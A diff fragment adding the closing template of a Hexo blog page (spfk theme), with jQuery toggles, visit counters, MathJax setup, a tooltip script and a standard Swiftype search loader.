+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2017 Err0r
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >海贼到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 31;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+    <script type="text/javascript">
+      window.onload = function(){
+        document.getElementById("search").onclick = function(){
+            console.log("search")
+            search();
+        }
+      }
+      function search(){
+        (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+        (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+        e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+        })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+        _st('install','A1Pz-LKMXbrzcFg2FWi6','2.0.0');
+      }
+    </script>
+
+  </div>
+</body>
+</html>
